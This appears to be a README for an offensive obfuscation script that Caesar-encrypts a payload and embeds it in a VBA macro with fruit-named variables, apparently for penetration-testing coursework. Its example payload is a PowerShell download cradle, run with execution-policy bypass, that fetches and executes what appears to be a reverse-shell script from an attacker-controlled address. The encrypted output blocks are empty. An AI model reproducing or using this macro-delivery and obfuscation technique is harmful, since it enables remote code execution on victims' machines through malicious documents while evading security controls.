# Fruits Technique
Fruit name variables + string to char array + caesar cipher

## Usage
You can encrypt your payload using `fruitsEncode.ps1` and the copy the result in the `Apples` variable in the `fruits.vba` macro.

### Encrypt
```powershell
./fruitsEncode.ps1 -mode encrypt -caesar 17 -text "powershell -exec bypass -c iex((new-object system.net.webclient).downloadstring('http://192.168.45.175:8000/shells/obfuscate_rev.ps1'))"
```
Output:
```txt

```
Additionally, if your command is very long and you want to quickly copy the text into your VBA editor while considering the 1023 character-per-line limit, you can use `-vbaprint` to get an output capped at 1019 characters.

## Decrypt
```powershell
./fruitsEncode.ps1 -mode decrypt -caesar 17 -text ""
```
Output:
```powershell
powershell -exec bypass -c iex((new-object system.net.webclient).downloadstring('http://192.168.45.175:8000/shells/obfuscate_rev.ps1'))
```
